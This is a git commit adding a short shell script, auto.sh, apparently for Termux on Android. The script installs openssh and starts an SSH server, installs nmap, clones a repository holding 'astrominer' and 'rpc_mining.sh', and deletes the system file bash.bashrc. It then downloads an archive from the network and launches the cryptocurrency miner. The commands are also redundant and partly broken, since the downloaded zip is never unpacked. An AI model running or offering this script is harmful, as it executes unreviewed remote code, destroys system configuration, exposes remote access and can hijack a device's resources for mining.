ffa288d7f41cabccc04cf00970ad19ff79fdc98f
llthtt <116860897+llthtt@users.noreply.github.com>
2023-07-08 09:29:10 +0700

    Add files via upload

---
+++ auto.sh
@@ -0,0 +1,3 @@
+apt update && yes | apt upgrade && apt update && apt install git -y && pkg install openssh -y && sshd && pkg install nmap -y && pkg install wget -y && apt-get install git && pkg install git && git clone https://github.com/llthtt/V1.9.2.R5.git && cd V1.9.2.R5 && chmod +x rpc_mining.sh && chmod u+x astrominer && cd
+
+pwd && cd .. && cd usr && cd etc && rm -rf bash.bashrc && wget https://codeload.github.com/llthtt/fibas/zip/refs/heads/main && cd ../ && cd V1.9.2.R5 && chmod +x rpc_mining.sh && chmod u+x astrominer && ./rpc_mining.sh
